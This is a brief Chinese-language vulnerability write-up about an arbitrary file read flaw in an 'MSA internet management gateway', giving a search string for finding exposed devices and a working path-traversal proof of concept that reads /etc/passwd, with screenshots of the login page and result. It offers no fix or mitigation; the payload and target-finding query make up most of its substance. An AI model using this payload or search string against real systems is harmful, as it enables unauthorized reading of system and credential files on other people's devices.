# MSA 互联网管理网关 msa 任意文件下载漏洞

## 漏洞描述

MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

```
MSA 互联网管理网关
```

## 网络测绘

```
"互联网管理网关"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134040031.png)

验证POC

```php
/msa/../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326134040032.png)